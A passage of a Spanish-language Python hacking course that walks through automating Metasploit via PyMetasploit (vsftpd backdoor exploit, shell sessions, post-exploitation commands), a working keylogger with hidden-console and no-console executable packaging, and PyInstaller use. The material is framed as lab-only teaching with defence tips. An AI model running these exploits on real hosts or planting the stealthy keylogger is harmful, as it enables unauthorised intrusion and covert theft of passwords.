> Este paso es obligatorio para que PyMetasploit se pueda conectar.

---

### üîó Paso 3: Conectarse desde Python

```python
from pymetasploit3.msfrpc import MsfRpcClient

# Con√©ctate usando la contrase√±a que definiste (123)
client = MsfRpcClient('123')
```

‚úÖ Si no da error, est√°s conectado.

---

### üéØ Paso 4: Cargar un exploit

Vamos a usar el famoso exploit:

```
unix/ftp/vsftpd_234_backdoor
```

```python
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
```

---

### üîß Paso 5: Ver y configurar opciones del exploit

```python
print("Opciones del exploit:")
for option, info in exploit.options.items():
    print(f"- {option}: {info['desc']} (Requerido: {info['required']})")
```

#### Configurar opciones necesarias:

```python
exploit['RHOSTS'] = '192.168.56.102'  # IP de tu v√≠ctima Metasploitable
exploit['RPORT'] = 21                # Puerto FTP vulnerable
```

---

### üß¨ Paso 6: Elegir un payload compatible

```python
print("Payloads compatibles:")
for p in exploit.compatible_payloads:
    print(f"- {p}")
```

Seleccionamos uno:

```python
payload = client.modules.use('payload', 'cmd/unix/interact')
```

> Este payload simplemente nos da una shell interactiva en Unix si el exploit funciona.

---

### üß™ Paso 7: Ejecutar el exploit

```python
print("[*] Ejecutando el exploit...")
job = exploit.execute(payload=payload)
```

---

### ‚è≥ Paso 8: Verificar si hay una sesi√≥n abierta

```python
import time
time.sleep(5)  # Esperamos un poco para que se abra la sesi√≥n

if client.sessions.list:
    print("[+] Sesi√≥n activa:")
    for sid, session in client.sessions.list.items():
        print(f"ID: {sid}, Tipo: {session['type']}, Plataforma: {session['platform']}")
else:
    print("[-] No se abri√≥ ninguna sesi√≥n.")
```

---

### üéâ Paso 9: Interactuar con la sesi√≥n (opcional)

```python
sid = list(client.sessions.list.keys())[0]
session = client.sessions.session(sid)

# Ejecutar un comando dentro de la sesi√≥n
output = session.run_with_output('whoami')
print("Salida del comando 'whoami':")
print(output)
```

---

#### üìú Script completo de ejemplo

```python
from pymetasploit3.msfrpc import MsfRpcClient
import time

# Conexi√≥n
client = MsfRpcClient('123')

# Elegir exploit y payload
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
exploit['RHOSTS'] = '192.168.56.102'
exploit['RPORT'] = 21

payload = client.modules.use('payload', 'cmd/unix/interact')

# Ejecutar
print("[*] Lanzando exploit...")
exploit.execute(payload=payload)

# Esperar y revisar sesiones
time.sleep(5)

if client.sessions.list:
    sid = list(client.sessions.list.keys())[0]
    session = client.sessions.session(sid)
    print("[+] Sesi√≥n abierta. Ejecutando comando...")
    print(session.run_with_output('uname -a'))
else:
    print("[-] No se obtuvo sesi√≥n.")
```

---

### ‚úÖ Consejos para el laboratorio

- Usa **Nmap** para confirmar que el puerto est√° abierto:

  ```bash
  nmap -p 21 192.168.56.102
  ```

- Usa exploits conocidos y probados para pruebas (como el `vsftpd_234_backdoor` o `ms08_067_netapi` en Windows XP SP2).

- Verifica que no haya **firewalls** bloqueando la conexi√≥n en tu m√°quina v√≠ctima.

---

### üîê Importante

‚úÖ Este conocimiento debe usarse **solo en entornos de laboratorio o pruebas controladas**. Nunca uses estos scripts en sistemas reales sin autorizaci√≥n.

---

[üîº](#√≠ndice)

---

## **229. PyMetasploit: Manejo de sesiones**

### üß† ¬øQu√© es una "sesi√≥n" en Metasploit?

Cuando lanzas un exploit y este **tiene √©xito**, se establece una "sesi√≥n" con el sistema comprometido.

Hay varios tipos:

- **Meterpreter**: Interactivo y potente (m√°s usado).
- **Shell**: B√°sico, tipo terminal sin funciones avanzadas.
- **Post**: Sesiones para ejecutar m√≥dulos post-explotaci√≥n.

Con PyMetasploit, puedes:

- Enumerar todas las sesiones abiertas.
- Obtener informaci√≥n detallada de cada sesi√≥n.
- Ejecutar comandos en la m√°quina v√≠ctima.
- Cerrar sesiones desde c√≥digo.

---

### ‚úÖ Requisitos previos

1. **Metasploit Framework instalado** (viene en Kali Linux).
2. **PyMetasploit3 instalado**:

   ```bash
   pip install pymetasploit3
   ```

3. **Metasploit RPC activo**:
   Desde `msfconsole`, ejecuta:

   ```bash
   load msgrpc Pass=123
   ```

4. **Conexi√≥n con una m√°quina vulnerable** (por ejemplo, Metasploitable2 o una m√°quina TryHackMe).

---

### üì¶ 1. Conexi√≥n al servicio RPC de Metasploit

```python
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('123')  # Contrase√±a que usaste en msfconsole
```

---

### üîç 2. Ver todas las sesiones activas

```python
sessions = client.sessions.list

if sessions:
    print("[+] Sesiones activas encontradas:")
    for sid, details in sessions.items():
        print(f"ID: {sid}, Tipo: {details['type']}, Plataforma: {details['platform']}, Usuario: {details['username']}")
else:
    print("[-] No hay sesiones abiertas.")
```

#### üß™ Ejemplo de salida:

```
[+] Sesiones activas encontradas:
ID: 1, Tipo: meterpreter, Plataforma: windows, Usuario: Administrator
```

---

### üéØ 3. Obtener una sesi√≥n espec√≠fica y ejecutar comandos

Supongamos que ya hay una sesi√≥n con ID `1`.

```python
session_id = 1
session = client.sessions.session(session_id)

# Ejecutar un comando remoto
output = session.run_with_output('whoami')
print("Resultado de whoami:")
print(output)
```

---

### üß∞ 4. Ejecutar varios comandos en una sesi√≥n (tipo script)

```python
comandos = ['whoami', 'ipconfig', 'systeminfo']

for cmd in comandos:
    print(f"\n[*] Ejecutando: {cmd}")
    print(session.run_with_output(cmd))
```

> Esto es √∫til para automatizar recolecci√≥n de informaci√≥n post-explotaci√≥n.

---

### üßπ 5. Cerrar una sesi√≥n desde Python

```python
session.stop()
print(f"[!] Sesi√≥n {session_id} cerrada correctamente.")
```

---

### üîÅ 6. Ejemplo completo: detectar, interactuar y cerrar sesiones

```python
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('123')

if client.sessions.list:
    for sid in client.sessions.list:
        print(f"\n[+] Interactuando con sesi√≥n {sid}")
        sesion = client.sessions.session(sid)
        print(sesion.run_with_output('whoami'))

        # Cerrar la sesi√≥n si deseas
        sesion.stop()
        print(f"[-] Sesi√≥n {sid} cerrada.")
else:
    print("[-] No hay sesiones activas.")
```

---

### ‚öôÔ∏è Extras √∫tiles

#### ‚ñ∂ Obtener la informaci√≥n b√°sica de una sesi√≥n:

```python
info = client.sessions.list[1]
print(f"Usuario: {info['username']}, IP: {info['tunnel_peer']}, Sistema: {info['platform']}")
```

#### ‚ñ∂ Saber si es una sesi√≥n Meterpreter:

```python
if info['type'] == 'meterpreter':
    print("¬°Sesi√≥n Meterpreter activa!")
```

---

### ‚úÖ D√≥nde probar esto (laboratorio)

| Herramienta         | Uso                                      |
| ------------------- | ---------------------------------------- |
| Kali Linux          | Atacante, con Metasploit y Python        |
| Metasploitable2     | V√≠ctima (contiene servicios vulnerables) |
| VirtualBox o VMware | Para simular red local segura            |

- Ataca la m√°quina usando un exploit como `vsftpd_234_backdoor`.
- Una vez abierta la sesi√≥n, usa PyMetasploit para automatizar la post-explotaci√≥n.

---

### üß† Conclusi√≥n

| Tarea            | C√≥digo Python usado              |
| ---------------- | -------------------------------- |
| Listar sesiones  | `client.sessions.list`           |
| Acceder a sesi√≥n | `client.sessions.session(ID)`    |
| Ejecutar comando | `session.run_with_output("cmd")` |
| Cerrar sesi√≥n    | `session.stop()`                 |

Este manejo te permite **crear tus propias herramientas de post-explotaci√≥n** o un framework personalizado para interactuar con Metasploit sin necesidad de escribir en `msfconsole`.

---

[üîº](#√≠ndice)

---

## **230. Keylogger con Python**

### üß† ¬øQu√© es un Keylogger?

Un **keylogger** (abreviatura de _keystroke logger_) es un programa que **registra las teclas presionadas por el usuario**. Esto puede incluir contrase√±as, mensajes, correos y comandos.

---

### üß∞ Requisitos

Para crear un keylogger en Python necesitamos:

- Python 3
- Biblioteca `pynput` (para capturar teclas)

#### Instalaci√≥n:

```bash
pip install pynput
```

---

### üß™ Ejemplo de Keylogger B√°sico

```python
from pynput import keyboard

# Ruta donde se guardar√° el archivo de registro
log_file = "keylog.txt"

def guardar_en_archivo(tecla):
    try:
        with open(log_file, "a") as f:
            f.write(f"{tecla.char}")
    except AttributeError:
        # Teclas especiales (shift, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f" [{tecla}] ")

# Escuchador de teclado
with keyboard.Listener(on_press=guardar_en_archivo) as listener:
    listener.join()
```

---

### üß™ ¬øQu√© hace este c√≥digo?

- Escucha cada vez que se presiona una tecla.
- Escribe esa tecla en el archivo `keylog.txt`.
- Soporta letras, n√∫meros y teclas especiales como `ENTER`, `SPACE`, `SHIFT`.

---

### ‚ñ∂Ô∏è ¬øC√≥mo ejecutarlo?

1. Guarda el c√≥digo como `keylogger.py`.
2. Ejecuta:

```bash
python keylogger.py
```

3. Abre otro programa (por ejemplo, un bloc de notas) y empieza a escribir.
4. Revisa el archivo `keylog.txt`.

---

### üõ°Ô∏è C√≥mo detenerlo

Presiona `Ctrl + C` en la terminal para detenerlo, o cierra el proceso si lo ejecutaste en segundo plano.

---

### üì¶ Versi√≥n con registro y env√≠o autom√°tico por correo (opcional)

Este paso **solo para entorno educativo**: agrega la funcionalidad para que el keylogger se autoenv√≠e por correo (por ejemplo, a ti mismo para fines de an√°lisis).

> Este tipo de funcionalidad **NO debe usarse con fines maliciosos.**

---

### üíª Ejecuci√≥n en segundo plano (opcional)

Puedes ejecutarlo como proceso oculto:

```python
import os
import sys

# Ocultar consola (solo Windows)
if os.name == 'nt':
    import ctypes
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
```

O convertirlo en ejecutable con `pyinstaller`:

```bash
pip install pyinstaller
pyinstaller --onefile --noconsole keylogger.py
```

---

### üìã Ejemplo final m√°s completo

```python
from pynput import keyboard

log_file = "keylog.txt"

def guardar_en_archivo(tecla):
    tecla = str(tecla).replace("'", "")
    with open(log_file, "a") as f:
        f.write(tecla + " ")

def main():
    with keyboard.Listener(on_press=guardar_en_archivo) as listener:
        listener.join()

if __name__ == "__main__":
    main()
```

---

### üß™ Entorno de prueba recomendado

| Elemento            | Herramienta                     |
| ------------------- | ------------------------------- |
| M√°quina virtual     | VirtualBox o VMware             |
| SO recomendado      | Kali Linux o Windows en VM      |
| Control del entorno | Snapshots para restaurar estado |

---

### üîí C√≥mo defenderse (lecci√≥n de seguridad)

- Usa antivirus con detecci√≥n heur√≠stica.
- Revisa procesos sospechosos en segundo plano.
- Revisa archivos `.py` o `.exe` ejecut√°ndose sin raz√≥n.
- Usa herramientas como `Autoruns` en Windows para detectar persistencia.

---

### ‚úÖ Conclusi√≥n

| Elemento                        | Herramienta o m√©todo        |
| ------------------------------- | --------------------------- |
| Captura de teclas               | `pynput.keyboard.Listener`  |
| Guardado                        | Archivos de texto (`.txt`)  |
| Automatizaci√≥n o env√≠o opcional | Env√≠o por correo, red, etc. |
| Ejecuci√≥n oculta (Windows)      | `ctypes.windll...`          |

---

[üîº](#√≠ndice)

---

## **231. Compilar programas en Python: Pyinstaller**

### üß† ¬øQu√© es PyInstaller?

**PyInstaller** es una herramienta que te permite **convertir programas en Python (.py)** en **archivos ejecutables (.exe, .app, etc.)** que pueden funcionar **sin necesidad de tener Python instalado**.

### ‚úÖ ¬øPara qu√© sirve en un entorno de estudio?

- Crear herramientas educativas portables.
- Distribuir tus scripts a otros estudiantes sin pedirles que instalen Python.
- Automatizar scripts de an√°lisis forense, esc√°neres de red, mini exploit labs, etc.
- Estudiar c√≥mo los ejecutables Python funcionan en sistemas Windows, Linux o macOS.

---

### üõ†Ô∏è Instalaci√≥n paso a paso

#### 1. üì¶ Instalar PyInstaller

En cualquier sistema con Python 3:

```bash
pip install pyinstaller
```

Puedes verificar que se instal√≥ correctamente con:

```bash
pyinstaller --version
```

---

##### üìÅ Estructura de tu proyecto

Supongamos que tienes un script llamado `mi_script.py` con este contenido:

```python
# mi_script.py
print("¬°Hola! Esto es un programa educativo compilado con PyInstaller.")
```

---

#### üõ†Ô∏è 2. Compilar el script

```bash
pyinstaller --onefile mi_script.py
```

##### üìå ¬øQu√© hace este comando?

- `--onefile`: crea **un solo archivo ejecutable** (no una carpeta con muchos archivos).
- `mi_script.py`: es tu script fuente.

##### ‚úÖ Resultado

Despu√©s de compilar, PyInstaller crea esta estructura:

```
mi_script/
‚îú‚îÄ‚îÄ build/        ‚Üê Carpeta temporal
‚îú‚îÄ‚îÄ dist/         ‚Üê Aqu√≠ est√° tu ejecutable
‚îÇ   ‚îî‚îÄ‚îÄ mi_script (o mi_script.exe en Windows)
‚îú‚îÄ‚îÄ mi_script.spec
```

Tu ejecutable estar√° en:
üîπ `dist/mi_script` o `dist/mi_script.exe`

---

#### ‚ñ∂Ô∏è 3. Ejecutar el programa compilado

##### En Linux/macOS:

```bash
./dist/mi_script
```

##### En Windows (doble clic o CMD):

```cmd
dist\mi_script.exe
```

---

#### ‚öôÔ∏è Opciones √∫tiles de PyInstaller

| Opci√≥n            | Descripci√≥n                                            |
| ----------------- | ------------------------------------------------------ |
| `--onefile`       | Crea un solo archivo ejecutable                        |
| `--noconsole`     | Oculta la terminal (ideal para GUIs o scripts ocultos) |
| `--icon=icon.ico` | Agrega un icono personalizado al ejecutable            |
| `--clean`         | Limpia archivos temporales antes de compilar           |

#### Ejemplo con opciones:

```bash
pyinstaller --onefile --noconsole --icon=educativo.ico mi_script.py
```

---

### üß™ Ejemplo m√°s completo

```python
# escaner_red.py
import socket

print("Esc√°ner de puertos educativos")
target = input("IP a escanear: ")

for port in range(20, 1025):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.5)
    result = s.connect_ex((target, port))
    if result == 0:
        print(f"Puerto abierto: {port}")
    s.close()
```

Luego compilas as√≠:

```bash
pyinstaller --onefile escaner_red.py
```

Y ahora puedes distribuir tu esc√°ner como ejecutable (sin requerir Python).

---

### üß™ ¬øD√≥nde usar esto?

En un **entorno de estudio o laboratorio** puedes:

| Uso educativo                | Ejemplo con PyInstaller                            |
| ---------------------------- | -------------------------------------------------- |
| Hacer herramientas portables | Esc√°neres, analizador de archivos, etc.            |
| Crear binarios para CTF      | Cifrado, backdoor educativo, mini exploits         |
| Aprender an√°lisis de malware | Compilar un "keylogger controlado" para analizarlo |
| Automatizar tareas de clase  | GUI educativa, script para recolectar evidencias   |

---

### ‚ùå Errores comunes

| Error                                     | Soluci√≥n                                                |
| ----------------------------------------- | ------------------------------------------------------- |
| `Permission denied`                       | Ejecuta con permisos: `chmod +x` o `sudo` si hace falta |
| `ModuleNotFoundError` despu√©s de compilar | Usa `--hidden-import` o revisa tu `spec` file           |
| No corre en otra PC                       | Usa la opci√≥n `--onefile` y compila en esa arquitectura |

---

### üîê ¬øEsconde el c√≥digo?

No realmente. Aunque lo empaqueta como ejecutable, **el c√≥digo puede extraerse** (con herramientas como `uncompyle6`, `pyinstxtractor`, etc.).
Sirve m√°s como **portabilidad**, no como ofuscaci√≥n real.

---

### ‚úÖ Resumen

| Acci√≥n                     | Comando                                   |
| -------------------------- | ----------------------------------------- |
| Instalar PyInstaller       | `pip install pyinstaller`                 |
| Compilar ejecutable b√°sico | `pyinstaller --onefile mi_script.py`      |
| Sin consola (modo oculto)  | `--noconsole`                             |
| Ejecutar binario           | `./dist/mi_script` o `dist\mi_script.exe` |

---

[üîº](#√≠ndice)

---

| **Inicio**         | **atr√°s 4**                                                     | **Siguiente 6**                                                              |
| ------------------ | --------------------------------------------------------------- | ---------------------------------------------------------------------------- |
| [üè†](../README.md) | [‚è™](./4_4_Analisis_de_vulnerabilidades_en_Hosts_con_Python.md) | [‚è©](./4_6_Python_Hacking_y_Explotacion_de_redes_informaticas_con_Python.md) |
